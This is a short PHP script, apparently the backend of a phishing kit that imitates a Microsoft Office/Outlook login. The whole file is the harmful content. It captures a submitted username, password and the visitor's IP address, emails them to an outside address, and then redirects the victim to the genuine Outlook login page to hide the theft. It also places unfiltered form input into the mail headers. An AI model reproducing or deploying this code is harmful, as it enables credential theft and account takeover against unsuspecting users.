<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Username : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "IP : ".$ip."\n";
$send = "vigo147@post.com";
$subject = "~ office ~";
$headers = "From: StarBoy <vigo147@post.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://outlook.office.com/owa/");
	  

?>